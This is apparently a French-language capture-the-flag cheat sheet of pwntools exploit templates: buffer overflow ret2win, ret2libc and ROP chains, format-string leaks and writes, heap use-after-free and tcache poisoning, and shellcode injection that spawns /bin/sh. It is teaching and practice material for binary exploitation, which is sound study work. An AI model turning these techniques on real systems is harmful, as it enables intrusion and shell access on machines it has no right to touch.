# Writeups Pwn — Exemples de challenges résolus

## Buffer overflow basique (ret2win)
```python
from pwn import *
p = remote('host', port)
# Trouver offset: cyclic(200) puis cyclic_find(core.fault_addr)
offset = 40
payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

## ret2libc (32-bit)
```python
from pwn import *
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)
# Leak libc via puts@plt
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
# Calculer base libc puis system('/bin/sh')
```

## ret2libc (64-bit) — gadgets
```python
from pwn import *
# 64-bit: args dans RDI, RSI, RDX
rop.rdi = next(elf.search(asm('pop rdi; ret')))
payload = flat(b'A'*offset, rop.rdi, elf.got['puts'], elf.plt['puts'], main)
```

## Format string — Leak + Write
```python
# Leak stack/libc
p.sendline(b'%p.'*20)          # dump pointeurs
p.sendline(b'%7$p')            # argument #7
# Ecrire adresse
p.sendline(b'%10$n')           # ecrire nb chars ecrits a arg#10
# fmtstr_payload de pwntools
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

## Heap — Use After Free
```python
# 1. Allouer chunk A
# 2. Free chunk A
# 3. Allouer chunk B (meme taille = recycle A)
# 4. Acceder A → accede B
```

## Heap — tcache poisoning (glibc 2.31+)
```python
# Overwrite fd de chunk free pour pointer vers target
# Allouer 2 fois → 2eme alloue target
```

## Shellcode injection
```python
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
# NOP sled + shellcode
payload = b'\x90' * 100 + shellcode
```

## ROP chain — execve('/bin/sh')
```python
from pwn import *
rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh')), 0, 0)
```
